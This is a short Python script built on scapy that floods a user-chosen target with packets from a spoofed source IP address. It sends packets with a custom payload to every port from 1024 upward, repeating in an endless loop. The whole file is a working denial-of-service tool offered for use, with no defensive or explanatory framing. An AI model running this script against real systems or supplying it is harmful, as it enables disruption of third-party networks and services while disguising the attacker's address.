#! /usr/bin/python

from scapy.all import *


def synFlood(src, tgt, message):
	for dport in range(1024, 65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)

source = input("[*] Enter Source IP Address To Fake: ")
target = input("[*] Enter Targets IP Address: ")
message = input("[*] Enter The Message For TCP Payload: ")

while True:
	synFlood(source, target, message)
